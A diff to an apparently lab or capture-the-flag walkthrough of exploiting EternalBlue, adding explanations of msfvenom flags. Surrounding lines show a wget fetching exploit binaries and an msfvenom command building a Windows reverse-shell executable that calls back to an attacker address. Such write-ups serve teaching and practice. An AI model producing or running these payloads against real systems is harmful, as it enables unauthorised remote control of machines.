@@ -67,6 +67,12 @@ wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.95 LPORT=7777 -f exe > eternal.exe
 ```
 
+* **-p flag:** Payload type.
+* **LHOST:** Listening IP address of the attacking machine.
+* **LPORT:** Listening port of the attacking machine.
+* **-f flag:** File format of payload.
+* **-o flag:** Where to save the file as well as name the file.
+
 This command will create our payload in an executable file named eternal.exe and it will create a reverse shell. Take note of the directory where the payload is located, as it will be needed when modifying the exploit as seen here:
 
 ![Before modifying](../.gitbook/assets/before-modifying-exploit.png)
